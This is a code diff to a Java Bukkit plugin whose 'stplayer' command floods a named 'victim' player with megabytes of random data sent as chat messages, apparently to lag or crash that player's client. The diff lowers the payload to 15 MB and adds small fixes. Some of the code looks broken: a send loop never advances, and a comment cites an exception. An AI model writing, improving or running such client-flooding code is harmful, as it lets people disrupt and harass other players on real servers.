@@ -12,7 +12,7 @@ public class Main extends JavaPlugin {
     public void onEnable() {
         this.getCommand("stplayer").setExecutor(this);
     }
-
+    @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (sender.hasPermission("stplayer.use") || !(sender instanceof Player)) {
             Player victim = Bukkit.getPlayer(args[0]);
@@ -21,6 +21,7 @@ public class Main extends JavaPlugin {
                 for (int i = 0; i < 5; ++i) {
                     if (victim == null || !victim.isOnline()) {
                         sender.sendMessage("Player offline or not found.");
+                        break;
                     }else {
                         this.stressPlayer(victim);
                     }
@@ -36,9 +37,10 @@ public class Main extends JavaPlugin {
 
     private void stressPlayer(Player victim) {
         try {
-            byte[] data = new byte[20971520]; // 20 MB
+            byte[] data = new byte[15728640]; // 15 MB
             new Random().nextBytes(data);
             this.sendLargeMessage(victim, data);
+            data = null;
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -49,5 +51,6 @@ public class Main extends JavaPlugin {
         while (player.isOnline() && !dataString.isEmpty()) {
             player.sendMessage(player.getUniqueId(), dataString); //IDK it get java.util.NoSuchElementException:
         }
+        dataString=null;
     }
 }
